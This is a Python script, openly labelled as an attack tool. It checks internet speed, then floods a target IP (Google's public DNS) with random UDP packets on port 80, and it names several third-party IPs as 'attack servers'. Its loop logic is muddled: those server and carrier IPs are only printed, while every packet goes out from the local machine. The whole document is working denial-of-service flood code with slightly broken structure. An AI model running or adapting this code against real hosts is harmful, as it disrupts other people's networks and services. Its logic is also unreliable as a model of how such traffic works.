import requests
import random
import socket
import signal
import sys
import speedtest

# Global variables
carrier_ips = ["27.61.154.148"]  # Your device's IP
attack_servers = ["149.202.182.136", "185.54.175.156", "62.76.249.38"]
targets = ["8.8.8.8"]  # Google's public DNS, for testing

# Function to handle graceful shutdown when script is interrupted
def signal_handler(sig, frame):
    print("\nAttack stopped. Gracefully shutting down.")
    sys.exit(0)

# Register signal handler to catch interruption (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Function to test internet speed
def get_speed():
    try:
        st = speedtest.Speedtest()
        st.get_best_server()  # Finds the best server
        download_speed = st.download() / 1_000_000  # in Mbps
        upload_speed = st.upload() / 1_000_000  # in Mbps
        return download_speed, upload_speed
    except Exception as e:
        print(f"Error testing speed: {e}")
        return 0, 0  # Return 0 Mbps if speed test fails

# Main logic to send floods
def send_attack():
    try:
        # Get initial speed before the attack
        print("Checking speed...")
        initial_download, initial_upload = get_speed()
        print(f"Initial Speed - Download: {initial_download:.2f} Mbps, Upload: {initial_upload:.2f} Mbps")

        print("\nStarting attack...")

        for server in attack_servers:
            print(f"Attacking server {server}")
            for carrier in carrier_ips:
                print(f"Sending floods to {carrier}")
                for target in targets:
                    try:
                        # Send random UDP packets to the target IP and port
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.sendto(random._urandom(1490), (target, 80))  # Example port 80
                        print(f"Sent packet to {target} from {server}")
                    except Exception as e:
                        print(f"Error sending packet to {target} from {server}: {e}")
                        continue  # Continue to the next target if one fails

        # Get speed after the attack
        print("\nAttack ended.")
        final_download, final_upload = get_speed()
        print(f"Final Speed - Download: {final_download:.2f} Mbps, Upload: {final_upload:.2f} Mbps")

    except Exception as e:
        print(f"Error in attack loop: {e}")
        sys.exit(1)  # Exit if the main attack loop encounters a critical error

# Run the attack and handle errors gracefully
if __name__ == "__main__":
    send_attack()
    print("Attack completed successfully.")
    
